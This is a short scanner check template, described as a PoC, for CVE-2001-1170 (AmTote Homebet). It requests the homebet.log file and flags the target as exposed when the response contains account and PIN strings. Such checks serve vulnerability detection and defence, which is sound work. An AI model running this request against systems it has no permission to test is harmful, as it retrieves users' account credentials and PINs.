[info]
author = "ave"
description = "检测 AmTote International Homebet 系统 homebet.log 日志文件是否可被未授权访问，该文件包含用户账户和 PIN 码等敏感凭证信息"
id = "POC-AVE-2001-0475"
name = "AmTote Homebet 日志文件信息泄露 PoC"
severity = "medium"
tags = ["ave-2001-0475"]
vuln_id = [
    "CVE-2001-1170",
    "AVE-2001-0475",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/homebet/homebet.log"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Account",
    "PIN",
    "homebet",
]
